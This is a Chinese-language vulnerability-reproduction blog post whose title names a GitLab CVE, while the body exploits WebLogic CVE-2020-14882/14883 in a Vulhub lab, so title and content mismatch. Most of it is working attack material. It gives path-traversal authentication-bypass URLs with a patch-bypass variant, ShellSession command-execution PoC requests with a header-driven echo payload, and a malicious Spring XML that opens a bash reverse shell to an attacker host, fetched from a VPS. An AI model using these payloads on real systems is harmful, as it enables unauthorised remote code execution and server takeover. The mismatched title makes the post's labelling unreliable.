---
title: GitLab 未授权RCE(CVE-2021-22205)  --花无名   
layout:mypost
categories: [漏洞复现]
---

## 漏洞说明

​	2020年10月21日，Oracle官方发布多个高危漏洞公告。其中组合利用CVE-2020-14882/ CVE-2020-14883可使未经授权的攻击者绕过WebLogic后台登录等限制，最终远程执行代码接管WebLogic服务器，利用难度极低，风险极大。

## 影响版本

​	10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0

## 复现

​	使用Vunhub靶场搭建，Weblogic 12.2.1.3.0版本

![image-20211110143835747](image-20211110143835747.png)

### 未授权访问-CVE-2020-14882

通过访问以下url可进行绕过验证，访问控制台

```
http://IP:7001/console/images/%252E%252E%252Fconsole.portal
http://IP:7001/console/css/%252E%252E%252Fconsole.portal
```

通过对路径的二次url编辑进行访问绕过，官方发布相对于的补丁可通过大小写的转化进行绕过补丁

```
/console/css/%252e%252e%252fconsole.portal //大写换成小写可绕过补丁
```

成功到控制台后，因权限比正常登录账户会小很多，缺少部署等功能。无法通过部署项目的方式进行RCE

![image-20211110144431426](image-20211110144431426.png)

### 远程RCE-CVE-2020-14883

通过配合未授权访问打组合拳，主要通过构造恶意请求的请求包，远程下载执行VPS内的恶意XML文件达到反弹shell 

#### 1.命令执行

直接可构造请求包进行命令执行，判断是否存在。拼接好get请求后，在后面加入需要执行的系统命令

Poc Windows

```
http://x.x.x.x:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27cmd%27);%22)
```

Poc Linux

```
GET /console/css/%252e%252e%2fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();%27) HTTP/1.1
Host: x.x.x.x:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ADMINCONSOLESESSION=z5ccPjdcv2OjbyH6CNmOHpulsxcMyPfnGM434PTom5QWuvadcN-u!-1073393521
Upgrade-Insecure-Requests: 1
cmd: whoami && pwd
```

#### ![image-20211110150339850](image-20211110150339850.png)2.恶意XML RCE

恶意XML文档准备，开启NC监听

XML写入需执行系统的命令

将准备的文档放置在目标机器可达的VPS内

```
 <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
 <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/x.x.x.x/7777  0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

2.构造请求进行访问执行

```
/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://ip/2.xml"）
```

![image-20211110145601643](image-20211110145601643.png)



再次查看监听机可获取权限内容

#### 3.脚本利用 RCE

GGyao写的利用脚本：https://github.com/backlion/CVE-2020-14882_ALL

脚本支持命令回显检测，批量命令回显检测，外置xml无命令检测。根据攻击需求进行使用

![image-20211110150426994](image-20211110150426994.png)

# 修复

根据业务升级升级升级

关闭后台/console/console.portal的访问权限

